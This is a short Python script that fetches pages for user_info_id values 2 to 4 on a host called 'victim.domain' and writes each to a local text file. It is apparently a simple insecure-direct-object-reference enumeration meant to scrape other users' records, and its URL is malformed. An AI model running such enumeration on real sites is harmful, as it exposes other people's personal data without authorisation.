#!/usr/bin/python3
# -*- coding: utf-8 -*-

import requests

for id in range(2,5):
    #id = 2
    url = "https//victim.domain?index.php?user_info_id=" + str(id) + "/"

    r = requests.get(url)
    page = 'file' + str(id) + '.txt'
    with open(page, 'w') as file:
        file.write(r.text)

print("done")